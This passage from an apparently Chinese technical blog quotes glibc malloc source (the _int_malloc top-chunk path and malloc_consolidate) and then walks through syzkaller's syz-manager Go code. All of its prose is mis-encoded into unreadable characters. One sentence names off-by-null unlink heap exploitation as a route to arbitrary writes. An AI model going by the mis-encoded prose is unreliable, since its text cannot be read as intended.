class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">  av-&gt;top = remainder;</span><br><span class="line">  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  check_malloced_chunk (av, victim, nb);</span><br><span class="line">  <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">  alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">&#123;</span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line">  <span class="comment">/* restore original bin index */</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç æ˜¯<code>_int_malloc</code>å‡½æ•°ä¸­çš„ç‰‡æ®µï¼Œè¿™ä¸ªç‰‡æ®µæ˜¯ä½¿ç”¨<code>top chunk</code>è¿›è¡Œåˆ†é…æ—¶çš„ç‰‡æ®µï¼Œé¦–å…ˆæ˜¯ç”³è¯·çš„å¤§å°åŠ ä¸Š16è¦å°äº<code>top chunk</code>çš„å¤§å°æ—¶è¿›å…¥åˆ°ç¬¬ä¸€ä¸ªåˆ†æ”¯ä¸­ï¼Œè¿™ä¸ªåˆ†æ”¯æ‰€åšçš„äº‹æƒ…çš„å¯¹<code>top chunk</code>è¿›è¡Œåˆ‡å‰²ã€‚</p><p>ç„¶åç›´æ¥çœ‹æœ€æœ«çš„è¿™ä¸€ä¸ªåˆ†æ”¯ï¼Œè¿™ä¸ªåˆ†æ”¯æ˜¯å‰ä¸¤ä¸ªéƒ½ä¸æ»¡è¶³æ—¶ä¼šè¿›å…¥ä¹Ÿå°±æ˜¯æ— æ³•ä»ç°æœ‰çš„<code>av</code>ä¸­å¾—åˆ°ç©ºé—´äº†ä¾¿å¼€å§‹ä½¿ç”¨<code>sysmalloc</code>è¿›è¡Œåˆ†é…ã€‚</p><p>ä¸­é—´çš„åˆ†æ”¯é¦–å…ˆä¼šæ£€æŸ¥<code>fastbin</code>ä¸­æ˜¯å¦å­˜åœ¨å †å—éšåè¿›å…¥åˆ°<code>malloc_consolidate</code>å‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = REVEAL_PTR (p-&gt;fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = chunksize (p);</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„æ‰€åšçš„äº‹æƒ…å°±æ˜¾è€Œæ˜“è§äº†ï¼Œå°±æ˜¯ä»<code>fastbin</code>ä¸­å–å‡ºå †å—è¿›è¡Œåˆå¹¶æ”¾å…¥åˆ°<code>unsorted bin</code>ä¸­ã€‚åç»­åˆ©ç”¨å°±ä¸è¯¦ç»†æäº†ï¼ˆå› ä¸ºæˆ‘ä¹Ÿæ²¡çœ‹äº†ï¼‰ä½†æ˜¯ä¼°è®¡å°±æ˜¯é€šè¿‡<code>off by null</code>æ‰“<code>unlink</code>å®ç°ä»»æ„åœ°å€å†™ã€‚</p><p>ä¸‹é¢å›å½’æ­£é¢˜å¼€å§‹<code>syzkaller</code>çš„åˆ†æï¼Œé¦–å…ˆå…¶å·¥ä½œåŸç†åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æè¿‡ï¼Œè¿™é‡Œå°±ä¸å†é‡æäº†ã€‚å‰ä¸€ç¯‡æ–‡ç« æåˆ°<code>syzkaller</code>åˆ†ä¸ºäº†ä¸‰å¤§ç»„ä»¶ï¼Œå…¶å®é€šè¿‡å›¾å°±èƒ½çœ‹å‡ºæ¥<code>syz-fuzzer</code>å’Œ<code>syz-executor</code>éƒ½æ˜¯ä½äºè™šæ‹Ÿæœºä¸­çš„ï¼Œè€Œ<code>syz-manager</code>ä½äºHostä¸»æœºä¸­ã€‚</p><p>è¿™é‡Œç›´æ¥åˆ†æå‡½æ•°ï¼Œåœ¨åˆ†æå‡½æ•°çš„è¿‡ç¨‹ä¸­å°†æœ‰ç”¨çš„ç»“æ„ä½“å†è¿›ä¸€æ­¥åˆ†æã€‚</p><h2 id="RunManagerå‡½æ•°"><a href="#RunManagerå‡½æ•°" class="headerlink" title="RunManagerå‡½æ•°"></a>RunManagerå‡½æ•°</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> prog.GitRevision == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">flag.Parse()</span><br><span class="line">log.EnableLogCaching(<span class="number">1000</span>, <span class="number">1</span>&lt;&lt;<span class="number">20</span>)</span><br><span class="line">cfg, err := mgrconfig.LoadFile(*flagConfig)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;%v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">RunManager(cfg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹<code>syz-manager</code>çš„<code>main</code>å‡½æ•°ï¼Œå…¶ä¼šè¯»å–ä¼ å…¥çš„é…ç½®æ–‡ä»¶ç„¶åç›´æ¥è°ƒç”¨<code>RunManager</code>å‡½æ•°ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RunManager</span><span class="params">(cfg *mgrconfig.Config)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> vmPool *vm.Pool</span><br><span class="line"><span class="keyword">if</span> cfg.Type != <span class="string">&quot;none&quot;</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">vmPool, err = vm.Create(cfg, *flagDebug)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;%v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆæ˜¯åˆå§‹åŒ–<code>VM pool</code>ä½¿ç”¨<code>vm.Create</code>å‡½æ•°è¿›è¡Œåˆ›å»ºã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Create</span><span class="params">(cfg *mgrconfig.Config, debug <span class="keyword">bool</span>)</span> <span class="params">(*Pool, error)</span></span> &#123;</span><br><span class="line">typ, ok := vmimpl.Types[vmType(cfg.Type)]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)</span><br><span class="line">&#125;</span><br><span class="line">env := &amp;vmimpl.Env&#123;</span><br><span class="line">Name:      cfg.Name,</span><br><span class="line">OS:        cfg.TargetOS,</span><br><span class="line">Arch:      cfg.TargetVMArch,</span><br><span class="line">Workdir:   cfg.Workdir,</span><br><span class="line">Image:     cfg.Image,</span><br><span class="line">SSHKey:    cfg.SSHKey,</span><br><span class="line">SSHUser:   cfg.SSHUser,</span><br><span class="line">Timeouts:  cfg.Timeouts,</span><br><span class="line">Debug:     debug,</span><br><span class="line">Config:    cfg.VM,</span><br><span class="line">KernelSrc: cfg.KernelSrc,</span><br><span class="line">&#125;</span><br><span class="line">impl, err := typ.Ctor(env)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;Pool&#123;</span><br><span class="line">impl:     impl,</span><br><span class="line">workdir:  env.Workdir,</span><br><span class="line">template: cfg.WorkdirTemplate,</span><br><span class="line">timeouts: cfg.Timeouts,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦åšçš„äº‹æƒ…æ˜¯ï¼Œé¦–å…ˆè·å–VMç±»å‹ï¼Œéšåå°è£…envç»“æ„ä½“ï¼Œæœ€åè°ƒç”¨<code>VM Pool</code>æ„é€ å‡½æ•°å¹¶è¿”å›ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Pool <span class="keyword">struct</span> &#123;</span><br><span class="line">impl        vmimpl.Pool</span><br><span class="line">workdir     <span class="keyword">string</span></span><br><span class="line">template    <span class="keyword">string</span></span><br><span class="line">timeouts    targets.Timeouts</span><br><span class="line">activeCount <span class="keyword">int32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç®€å•æä¸€ä¸‹Poolç»“æ„ä½“ï¼Œç±»ä¼¼äºçº¿ç¨‹æ± çš„æ¦‚å¿µï¼Œåœ¨<code>syz-manager</code>ä½¿ç”¨ä¸€ä¸ªVMæ± ä¹Ÿå°±æ˜¯Poolç»“æ„ä½“æ¥ç®¡ç†<code>Guest VM</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pool represents a set of test machines (VMs, physical devices, etc) of particular type.</span></span><br><span class="line">type Pool interface &#123;</span><br><span class="line"><span class="comment">// Count returns total number of VMs in the pool.</span></span><br><span class="line">Count() <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create creates and boots a new VM instance.</span></span><br><span class="line">Create(workdir <span class="built_in">string</span>, index <span class="keyword">int</span>) (Instance, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶æ¥å£å®ç°åˆä¸¤ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¿”å›å½“å‰æ± å­é‡Œæ‰€æœ‰çš„VMæ•°é‡ï¼Œç¬¬äºŒä¸ªæ˜¯åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªæ–°çš„å®ä¾‹ï¼Œå¹¶ä¸”è¿”å›è¿™ä¸ªå®ä¾‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crashdir := filepath.Join(cfg.Workdir, <span class="string">&quot;crashes&quot;</span>)</span><br><span class="line">osutil.MkdirAll(crashdir)</span><br><span class="line"></span><br><span class="line">reporter, err := report.NewReporter(cfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  log.Fatalf(<span class="string">&quot;%v&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›åˆ°<code>RunManager</code>å‡½æ•°ä¸­ï¼Œè¿™é‡Œä¸»è¦åšçš„äº‹æƒ…æ˜¯åˆ›å»ºä¸€ä¸ª<code>crashes</code>ç›®å½•ï¼Œç„¶åç”Ÿæˆä¸€ä¸ª<code>reporter</code>å®ä¾‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Report <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// Title contains a representative description of the first oops.</span></span><br><span class="line">Title <span class="keyword">string</span></span><br><span class="line"><span class="comment">// Alternative titles, used for better deduplication.</span></span><br><span class="line"><span class="comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span></span><br><span class="line">AltTitles []<span class="keyword">string</span></span><br><span class="line"><span class="comment">// Bug type (e.g. hang, memory leak, etc).</span></span><br><span class="line">Type Type</span><br><span class="line"><span class="comment">// The indicative function name.</span></span><br><span class="line">Frame <span class="keyword">string</span></span><br><span class="line"><span class="comment">// Report contains whole oops text.</span></span><br><span class="line">Report []<span class="keyword">byte</span></span><br><span class="line"><span class="comment">// Output contains whole raw console output as passed to Reporter.Parse.</span></span><br><span class="line">Output []<span class="keyword">byte</span></span><br><span class="line"><span class="comment">// StartPos/EndPos denote region of output with oops message(s).</span></span><br><span class="line">StartPos <span class="keyword">int</span></span><br><span class="line">EndPos   <span class="keyword">int</span></span><br><span class="line"><span class="comment">// SkipPos is position in output where parsing for the next report should start.</span></span><br><span class="line">SkipPos <span class="keyword">int</span></span><br><span class="line"><span class="comment">// Suppressed indicates whether the report should not be reported to user.</span></span><br><span class="line">Suppressed <span class="keyword">bool</span></span><br><span class="line"><span class="comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span></span><br><span class="line">Corrupted <span class="keyword">bool</span></span><br><span class="line"><span class="comment">// CorruptedReason contains reason why the report is marked as corrupted.</span></span><br><span class="line">CorruptedReason <span class="keyword">string</span></span><br><span class="line"><span class="comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span></span><br><span class="line">Recipients vcs.Recipients</span><br><span class="line"><span class="comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span></span><br><span class="line">GuiltyFile <span class="keyword">string</span></span><br><span class="line"><span class="comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span></span><br><span class="line">reportPrefixLen <span class="keyword">int</span></span><br><span class="line"><span class="comment">// symbolized is set if the report is symbolized.</span></span><br><span class="line">symbolized <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Report</code>ç»“æ„ä½“ç”¨æ¥è¡¨ç¤ºå•æ¬¡æ‰§è¡Œçš„ç»“æœï¼ŒåŒ…æ‹¬æ˜¯å¦äº§ç”Ÿäº†<code>crash</code>ã€<code>Oops</code>çš„ä¿¡æ¯ç­‰ç­‰ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mgr := &amp;Manager&#123;</span><br><span class="line">  cfg:              cfg,</span><br><span class="line">  vmPool:           vmPool,</span><br><span class="line">  target:           cfg.Target,</span><br><span class="line">  sysTarget:        cfg.SysTarget,</span><br><span class="line">  reporter:         reporter,</span><br><span class="line">  crashdir:         crashdir,</span><br><span class="line">  startTime:        time.Now(),</span><br><span class="line">  stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">  crashTypes:       <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  corpus:           <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]CorpusItem),</span><br><span class="line">  disabledHashes:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">  memoryLeakFrames: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  dataRaceFrames:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  fresh:            <span class="literal">true</span>,</span><br><span class="line">  vmStop:           <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>),</span><br><span class="line">  hubReproQueue:    <span class="built_in">make</span>(<span class="keyword">chan</span> *Crash, <span class="number">10</span>),</span><br><span class="line">  needMoreRepros:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">bool</span>),</span><br><span class="line">  reproRequest:     <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  usedFiles:        <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]time.Time),</span><br><span class="line">  saturatedCalls:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mgr.preloadCorpus()</span><br><span class="line">mgr.initStats() <span class="comment">// Initializes prometheus variables.</span></span><br><span class="line">mgr.initHTTP()  <span class="comment">// Creates HTTP server.</span></span><br><span class="line">mgr.collectUsedFiles()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create RPC server for fuzzers.</span></span><br><span class="line">mgr.serv, err = startRPCServer(mgr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  log.Fatalf(<span class="string">&quot;failed to create rpc server: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.DashboardAddr != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">  mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalf(<span class="string">&quot;failed to create dashapi connection: %v&quot;</span>, err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;</span><br><span class="line">  mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalf(<span class="string">&quot;failed 